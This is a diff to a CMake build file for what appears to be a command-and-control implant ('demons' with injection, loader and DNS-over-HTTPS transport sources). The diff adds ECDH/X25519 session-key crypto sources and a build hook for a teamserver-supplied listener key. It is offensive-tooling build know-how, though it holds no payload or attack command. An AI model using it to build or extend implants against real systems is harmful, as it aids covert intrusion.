@@ -52,6 +52,10 @@ set( INJECT_SOURCE
 
 set( CRYPT_SOURCE
         src/crypt/AesCrypt.c
+        src/crypt/X25519.c
+        src/crypt/Sha256.c
+        src/crypt/AesGcm.c
+        src/crypt/EcdhInit.c
 )
 
 set( MAIN_SOURCE
@@ -95,7 +99,13 @@ add_compile_definitions( TRANSPORT_DOH )
 add_compile_definitions( AES256 )
 
 # linking library
-link_libraries( netapi32 ws2_32 wsock32 wtsapi32 iphlpapi mscoree mscorlib )
+link_libraries( netapi32 ws2_32 wsock32 wtsapi32 iphlpapi mscoree mscorlib bcrypt )
+
+# ECDH session key exchange (ARC-11): uncomment and inject the listener public key
+# when building with ECDH mode.  ARCHON_LISTENER_PUBKEY must expand to a 32-element
+# C array initializer (e.g. {0x12,0x34,...,0xab}) supplied by the teamserver build API.
+# add_compile_definitions( ARCHON_ECDH_MODE )
+# add_compile_definitions( "ARCHON_LISTENER_PUBKEY={0}" )
 
 # add compiled demons
 add_executable( ${PROJECT_NAME} ${COMMON_SOURCE} ${INJECT_SOURCE} ${EXT_SOURCE} ${CRYPT_SOURCE} ${LOADER_SOURCE} ${MAIN_SOURCE} )
